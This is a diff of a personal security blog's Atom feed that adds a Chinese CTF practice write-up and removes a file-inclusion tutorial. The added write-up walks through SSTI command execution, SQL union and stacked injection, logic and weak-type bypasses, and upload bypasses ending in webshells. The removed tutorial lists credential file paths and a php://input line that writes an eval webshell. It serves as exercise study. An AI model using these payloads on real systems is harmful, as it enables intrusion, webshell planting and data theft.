@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://z0ekball.github.io</id>
     <title>z0ekball</title>
-    <updated>2022-04-14T19:26:29.740Z</updated>
+    <updated>2022-04-15T11:30:49.462Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://z0ekball.github.io"/>
     <link rel="self" href="https://z0ekball.github.io/atom.xml"/>
@@ -217,6 +217,171 @@ __globals__  对包含函数全局变量的字典的引用
 
 3、在线转换短网址代替
 </code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CTF刷题记录(二)]]></title>
+        <id>https://z0ekball.github.io/post/ctf-shua-ti-ji-lu-er/</id>
+        <link href="https://z0ekball.github.io/post/ctf-shua-ti-ji-lu-er/">
+        </link>
+        <updated>2022-01-10T11:22:08.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="第三章-web进阶ssti">[第三章 web进阶]SSTI</h2>
+<p>输入正常数字回显数字</p>
+<p>​                          <img src="https://z0ekball.github.io/post-images/image-20220415184319900.png" alt="image-20220415184319900" loading="lazy"></p>
+<p>输入运算语句回显结果，说明后台解析注入语句，了存在<code>ssti模板注入</code>漏洞</p>
+<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220415184426777.png" alt="image-20220415184328517" loading="lazy"></figure>
+<h3 id="ssti服务端模板注入"><code>ssti服务端模板注入</code>：</h3>
+<p>拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。</p>
+<p>漏洞原理:能够解析执行语句，因此能够写入命令行</p>
+<pre><code>password={{&quot;&quot;.__class__.__bases__[0].__subclasses__()}}找可用于执行os命令的类os._wrap_close
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220415184459378.png" alt="image-20220415184459378" loading="lazy"></figure>
+<p>os.<em>wrap_close在subclasses</em>_()中是第127个函数</p>
+<p>故构造</p>
+<pre><code>password={{&quot;&quot;.__class__.__bases__[0].__subclasses__()[127]}}，找到os._wrap_close
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20220415184535002.png" alt="image-20220415184535002" loading="lazy"></figure>
+<p>再通过构造</p>
+<pre><code>password={{&quot;&quot;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['popen']('ls').read()}}执行ls命令，查看目录
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/image-20220415184602056.png" alt="image-20220415184602056" loading="lazy"></figure>
+<p>再构造</p>
+<pre><code>password={{&quot;&quot;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['popen']('ls -F /app/').read()}}读取app目录下的文件，找到server.py
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/image-20220415184620383.png" alt="image-20220415184620383" loading="lazy"></figure>
+<p>再构造：</p>
+<pre><code>password={{&quot;&quot;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['popen']('cat /app/server.py').read()}}获取整个server.py
+</code></pre>
+<p>抓包在burpsuite里更容易看，找到了flag</p>
+<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/image-20220415184650597.png" alt="image-20220415184650597" loading="lazy"></figure>
+<h2 id="第三章-web进阶逻辑漏洞">[第三章 web进阶]逻辑漏洞</h2>
+<p>用户名：admin密码：admin登录进去之后，有商品，可以购买flag</p>
+<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/image-20220415184719331.png" alt="image-20220415184719331" loading="lazy"></figure>
+<p>点击购买，不够钱</p>
+<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/image-20220415184726084.png" alt="image-20220415184726084" loading="lazy"></figure>
+<p>购买别的商品，花费300</p>
+<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/image-20220415185202087.png" alt="image-20220415185202087" loading="lazy"></figure>
+<p>购买多次之后，钱不够了，说明后台在计算剩余钱数</p>
+<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/image-20220415185210458.png" alt="image-20220415185210458" loading="lazy"></figure>
+<p>推测计算公式为<code>总数-cost</code>，所以我们可以反向购买，使之变成<code>总数-（-cost）=总数+cost</code>，增加余额，达到需要的钱数</p>
+<pre><code>?cost=-300&amp;goods=3
+
+重复多次就空手套白狼，赚够钱了
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/image-20220415185244119.png" alt="image-20220415185244119" loading="lazy"></figure>
+<h2 id="linux-labs">Linux Labs</h2>
+<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/image-20220415185340992.png" alt="image-20220415185340992" loading="lazy"></figure>
+<p>连接靶机，在目录下找到flag</p>
+<figure data-type="image" tabindex="13"><img src="https://z0ekball.github.io/post-images/image-20220415185350167.png" alt="image-20220415185350167" loading="lazy"></figure>
+<h2 id="gxyctf2019babysqli">[GXYCTF2019]BabySQli</h2>
+<p>源码给出了提示，base32解码后base64解码得到查询的sql语句</p>
+<figure data-type="image" tabindex="14"><img src="https://z0ekball.github.io/post-images/image-20220415185406294.png" alt="image-20220415185406294" loading="lazy"></figure>
+<figure data-type="image" tabindex="15"><img src="https://z0ekball.github.io/post-images/image-20220415185413070.png" alt="image-20220415185413070" loading="lazy"></figure>
+<p>根据语句构造playload：1’#回显  <img src="https://z0ekball.github.io/post-images/image-20220415185433907.png" alt="image-20220415185433907" loading="lazy"></p>
+<p>说明存在注入漏洞</p>
+<p>再构造1'oR 1&gt;0#回显<img src="https://z0ekball.github.io/post-images/image-20220415185448715.png" alt="image-20220415185448715" loading="lazy"></p>
+<p>admin ' ORder by 3#回显<img src="https://z0ekball.github.io/post-images/image-20220415185455748.png" alt="image-20220415185455748" loading="lazy"></p>
+<p>admin' oRder by 4#回显<img src="https://z0ekball.github.io/post-images/image-20220415185503532.png" alt="image-20220415185503532" loading="lazy"></p>
+<p>说明存在3个注入点，使用联合注入admin'UnION select 1,2,3#回显<img src="https://z0ekball.github.io/post-images/image-20220415185523801.png" alt="image-20220415185523801" loading="lazy"></p>
+<p>name=admin'union select 1,'admin',3#&amp;pw=1回显<img src="https://z0ekball.github.io/post-images/image-20220415185534180.png" alt="image-20220415185534180" loading="lazy"></p>
+<p>说明2注入点为用户名</p>
+<h3 id="联合注入添加临时虚拟用户"><code>联合注入添加临时虚拟用户</code>：</h3>
+<p>union做查询时，查询的数据不存在，那么联合查询就会创建一个虚拟的数据存放在数据库中，也就是说可以构造一个不存在数据，就会创造一个虚拟的数据，构造playload:</p>
+<pre><code>name=1' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#&amp;pw=123456
+</code></pre>
+<p>'e10adc3949ba59abbe56e057f20f883e'即123456的MD5，注入语句在后台数据库中插入一个用户名为admin，密码为123456的数据，登录即得flag</p>
+<figure data-type="image" tabindex="16"><img src="https://z0ekball.github.io/post-images/image-20220415191059744.png" alt="image-20220415191059744" loading="lazy"></figure>
+<h2 id="actf2020-新生赛backupfile">[ACTF2020 新生赛]BackupFile</h2>
+<p>题目有提示backupfile，也就是<code>备份文件</code>，尝试<code>index.php.bak</code>,下载备份文件，得到flag.php</p>
+<figure data-type="image" tabindex="17"><img src="https://z0ekball.github.io/post-images/image-20220415191257713.png" alt="image-20220415191254602" loading="lazy"></figure>
+<h3 id="弱类型比较"><code>弱类型比较</code>：</h3>
+<pre><code>1、 字符串和数字比较，字符串会转换为数字 admin--&gt;0
+
+2、混合字符串转换为数字，看字符串的第一个 1admin--&gt;1  admin1--&gt;0
+
+3、字符串以xex开头（x表示数字），会被转换为科学计数法2e2=2*10^2=200  0e2=0e48=0
+</code></pre>
+<p>也就是说key=123就可以绕过key==str,playload:?key=123,得flag</p>
+<figure data-type="image" tabindex="18"><img src="https://z0ekball.github.io/post-images/image-20220415191348338.png" alt="image-20220415191348338" loading="lazy"></figure>
+<h2 id="极客大挑战-2019buyflag">[极客大挑战 2019]BuyFlag</h2>
+<p>源码中的一些提示：</p>
+<figure data-type="image" tabindex="19"><img src="https://z0ekball.github.io/post-images/image-20220415191401932.png" alt="image-20220415191401932" loading="lazy"></figure>
+<figure data-type="image" tabindex="20"><img src="https://z0ekball.github.io/post-images/image-20220415191407164.png" alt="image-20220415191407164" loading="lazy"></figure>
+<p>抓包后看到cookie里的user=0，改为1，即从假改为真，回显</p>
+<figure data-type="image" tabindex="21"><img src="https://z0ekball.github.io/post-images/image-20220415191414919.png" alt="image-20220415191414919" loading="lazy"></figure>
+<p>再根据条件上传钱和密码，密码存在弱类型比较，</p>
+<pre><code>playload：password=404a&amp;money=10000000
+</code></pre>
+<figure data-type="image" tabindex="22"><img src="https://z0ekball.github.io/post-images/image-20220415191422069.png" alt="image-20220415191422069" loading="lazy"></figure>
+<p>绕过了密码，但说钱太长了，改为科学计数</p>
+<pre><code>Playload：password=404a&amp;money=1e9，得到flag
+</code></pre>
+<figure data-type="image" tabindex="23"><img src="https://z0ekball.github.io/post-images/image-20220415191440479.png" alt="image-20220415191440479" loading="lazy"></figure>
+<h2 id="actf2020-新生赛upload">[ACTF2020 新生赛]Upload</h2>
+<p>存在<code>前端过滤</code></p>
+<figure data-type="image" tabindex="24"><img src="https://z0ekball.github.io/post-images/image-20220415191511501.png" alt="image-20220415191511501" loading="lazy"></figure>
+<p>把文件改成gif，抓包再改成php</p>
+<figure data-type="image" tabindex="25"><img src="https://z0ekball.github.io/post-images/image-20220415191522197.png" alt="image-20220415191522197" loading="lazy"></figure>
+<p>回显 <img src="https://z0ekball.github.io/post-images/image-20220415191532725.png" alt="image-20220415191532725" loading="lazy"></p>
+<p>用phtml绕过php过滤，得到文件路径</p>
+<figure data-type="image" tabindex="26"><img src="https://z0ekball.github.io/post-images/image-20220415191552251.png" alt="image-20220415191552251" loading="lazy"></figure>
+<p>访问页面</p>
+<figure data-type="image" tabindex="27"><img src="https://z0ekball.github.io/post-images/image-20220415191602138.png" alt="image-20220415191602138" loading="lazy"></figure>
+<p>蚁剑连接，得到webshell,命令行寻找flag</p>
+<figure data-type="image" tabindex="28"><img src="https://z0ekball.github.io/post-images/image-20220415191615940.png" alt="image-20220415191615940" loading="lazy"></figure>
+<h2 id="mrctf2020你传你呢">[MRCTF2020]你传你🐎呢</h2>
+<h3 id="htaccess绕过"><code>htaccess绕过</code>:</h3>
+<p>构造一个把同名文件解析成php格式的htaccess文件</p>
+<pre><code>//把hack.png解析成php
+
+&lt;FilesMatch &quot;hack.png&quot;&gt;
+
+SetHandler application/x-httpd-php
+
+&lt;/FilesMatch&gt;
+</code></pre>
+<p>上传htaccess文件，抓包修改类型为png</p>
+<figure data-type="image" tabindex="29"><img src="https://z0ekball.github.io/post-images/image-20220415191745173.png" alt="image-20220415191745173" loading="lazy"></figure>
+<p>再上传一个含有木马的假png，上传成功</p>
+<figure data-type="image" tabindex="30"><img src="https://z0ekball.github.io/post-images/image-20220415191753176.png" alt="image-20220415191753176" loading="lazy"></figure>
+<p>蚁剑连接，找到flag</p>
+<h2 id="suctf-2019easysql">[SUCTF 2019]EasySQL</h2>
+<p>抓包进行sql注入的<code>fuzz测试</code></p>
+<figure data-type="image" tabindex="31"><img src="https://z0ekball.github.io/post-images/image-20220415191815733.png" alt="image-20220415191815733" loading="lazy"></figure>
+<p>被过滤部分，回显nonono</p>
+<figure data-type="image" tabindex="32"><img src="https://z0ekball.github.io/post-images/image-20220415191827267.png" alt="image-20220415191827267" loading="lazy"></figure>
+<figure data-type="image" tabindex="33"><img src="https://z0ekball.github.io/post-images/image-20220415191841841.png" alt="image-20220415191834335" loading="lazy"></figure>
+<p>绕过这些语句和符号进行注入</p>
+<p>采用<code>堆叠注入</code>：</p>
+<p>查库：</p>
+<pre><code>1;show databases;
+</code></pre>
+<figure data-type="image" tabindex="34"><img src="https://z0ekball.github.io/post-images/image-20220415191912937.png" alt="image-20220415191912937" loading="lazy"></figure>
+<p>查表：</p>
+<pre><code>1;show tables;
+</code></pre>
+<figure data-type="image" tabindex="35"><img src="https://z0ekball.github.io/post-images/image-20220415191925237.png" alt="image-20220415191925237" loading="lazy"></figure>
+<p>查flag里的数据：</p>
+<pre><code>1;show columns from Flag;
+</code></pre>
+<p>无法访问</p>
+<figure data-type="image" tabindex="36"><img src="https://z0ekball.github.io/post-images/image-20220415192015126.png" alt="image-20220415192015126" loading="lazy"></figure>
+<p>由于输入字母不回显，只有输入数字才回显</p>
+<p>推测后台sql语句含有||（or），即select （注入语句）|| flag from Flag</p>
+<pre><code>构造*，1，即select *,1 || flag from Flag意思为select *,1 from Flag，即可显示所有内容
+</code></pre>
+<figure data-type="image" tabindex="37"><img src="https://z0ekball.github.io/post-images/image-20220415192051097.png" alt="image-20220415192051097" loading="lazy"></figure>
+<h2 id="actf2020-新生赛include">[ACTF2020 新生赛]Include</h2>
+<p>提示：</p>
+<figure data-type="image" tabindex="38"><img src="https://z0ekball.github.io/post-images/image-20220415192105507.png" alt="image-20220415192105507" loading="lazy"></figure>
+<p>采用<code>伪协议</code>方法读取flag</p>
+<p>构造：</p>
+<pre><code>file=php://filter/read=convert.base64-encode/resource=flag.php
+</code></pre>
+<p>返回flag.php的base64编码</p>
+<figure data-type="image" tabindex="39"><img src="https://z0ekball.github.io/post-images/image-20220415192127801.png" alt="image-20220415192127801" loading="lazy"></figure>
+<p>解密得flag</p>
+<figure data-type="image" tabindex="40"><img src="https://z0ekball.github.io/post-images/image-20220415192136925.png" alt="image-20220415192136925" loading="lazy"></figure>
 ]]></content>
     </entry>
     <entry>
@@ -1040,108 +1205,6 @@ $a = array($arrayName = ($arrayName =($arrayName = array('a' =&gt; $b($_POST['pa
 ?&gt;
 </code></pre>
 <p><code>工具利用</code>：传统方法利用菜刀管理webshell 的流量特征很明显，很容易被检测到，可使用流量加密的webshell工具，如冰蝎，来躲避流量监测。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[文件包含]]></title>
-        <id>https://z0ekball.github.io/post/wen-jian-bao-han/</id>
-        <link href="https://z0ekball.github.io/post/wen-jian-bao-han/">
-        </link>
-        <updated>2021-07-29T02:59:27.000Z</updated>
-        <content type="html"><![CDATA[<p><code>漏洞原理</code>：include()、include_once()、require()、require_once()等函数可以直接以php格式执行包含文件的代码，不受文件格式限制。web应用这些函数，且包含的文件路径是由用户传输参数方式引入，用户访问被包含文件时该文件以php格式解析。攻击者需要知道文件存放的路径才能进行访问。</p>
-<pre><code class="language-php">include():执行到include函数时才文件包含，找不到被包含的文件路径时，发出警告，脚本继续运行
-require():只要程序一运行就进行文件包含，找不到被包含的文件路径时，产生致命错误，脚本停止运行
-include_once()与require():与上述函数一样，只是若文件中代码已经被包含则不会再次包含
-</code></pre>
-<p><code>敏感路径</code>：</p>
-<p>典型：</p>
-<pre><code class="language-php">?page=a.php
-?home=b.html
-?file=content…
-</code></pre>
-<p>Windows：</p>
-<pre><code class="language-php">C:\boot.ini //查看系统版本
-C:\windows\system32\inetsrv\MetaBase.xml //IIS 配置文件
-C:\windows\repair\sam //存储 windows 系统初次安装的密码
-C:\Program Files\mysql\my.ini //mysql 配置
-C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
-C:\windows\php.ini //php 配置信息
-C:\windows\my.ini //mysql 配置文件
-</code></pre>
-<p>UNIX/Linux：</p>
-<pre><code class="language-php">/etc/passwd
-/usr/local/app/apache2/conf/httpd.conf //apache2 默认配置文件
-/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
-/usr/local/app/php5/lib/php.ini //PHP 相关配置
-/etc/httpd/conf/httpd.conf //apache
-/etc/php5/apache2/php.ini //ubuntu 系统的默认路径
-</code></pre>
-<h4 id="本地包含">本地包含</h4>
-<p>1.txt和1.php在同一文件目录下，被包含文件无论什么格式都能解析成php</p>
-<p>1.txt:</p>
-<pre><code class="language-php">&lt;?php phpinfo();?&gt;
-</code></pre>
-<p>1.php:</p>
-<pre><code class="language-php">&lt;?php
-$b=$_GET['id'];
-include($b);
-?&gt;
-</code></pre>
-<p><code>playload</code>:</p>
-<pre><code class="language-php">***/1.php?id=1.txt //返回phpinfo页面
-</code></pre>
-<h4 id="远程包含">远程包含</h4>
-<p><code>条件</code>： 一般 PHP 默认关闭远程包含，开启远程文件包含功能需要在 php.ini 中修改：<br>
-Allow_url_include = on、allow_url_fopen=on</p>
-<p><code>playload</code>:</p>
-<pre><code class="language-php">***/1.php?id=http:(文件绝对路径) 
-</code></pre>
-<h4 id="php伪协议">php伪协议</h4>
-<p><code>file://</code>:</p>
-<p>用于访问本地文件系统</p>
-<p>条件(php.ini)： allow_url_fopen   off/on    allow_url_include off/on</p>
-<pre><code class="language-php">file：//[文件的绝对路径和文件名]
-    file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
-file：//[文件的相对路径和文件名]
-    file=./phpinfo.txt
-file：//[http：//网络路径和文件名]
-    file=http://127.0.0.1/phpinfo.txt 
-</code></pre>
-<p><code>php：//filter</code>：</p>
-<p>用于读取源码并进行bash64编码输出；<br>
-条件（php.ini）：allow_url_fope   off/on  allow_url_include off/on</p>
-<pre><code class="language-php">php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码
-（针对php文件需要base64编码）
-</code></pre>
-<p><code>php：//input</code>：</p>
-<p>可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行；<br>
-条件(php.ini)：allow_url_fope   off/on     allow_url_include on</p>
-<pre><code class="language-php">php://input + [POST DATA]执行php代码
-</code></pre>
-<p>有写入权限则可以写入一句话木马</p>
-<pre><code class="language-php">php://input
-[POST DATA部分]
-&lt;?php fputs(fopen('1juhua.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;
-</code></pre>
-<p><code>php://stdin</code>:</p>
-<p>只读，php://stdout 和 php://stderr 是只写的。</p>
-<p><code>php://output</code>:是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p>
-<p><code>php://fd</code>:允许直接访问指定的文件描述符。</p>
-<p><code>zip://,bzip://,zlib://</code>:</p>
-<p>压缩流，可以访问压缩文件中的子文件，不需要传后缀名</p>
-<p>条件：    allow_url_fope   off/on    allow_url_include off/on</p>
-<pre><code class="language-php">zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）
-bzip2://file.bz2
-zlib://file.gz
-</code></pre>
-<p><code>data://</code>：</p>
-<p>传递相应格式数据，用于执行php代码</p>
-<p>条件：    allow_url_fope   on    allow_url_include on</p>
-<pre><code class="language-php">data://text/plain,&lt;?php%20phpinfo();?&gt;
-data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
-</code></pre>
-<p><code>phar：//</code></p>
-<p>与zip://类似，同样可以访问zip格式压缩包内容</p>
 ]]></content>
     </entry>
 </feed>
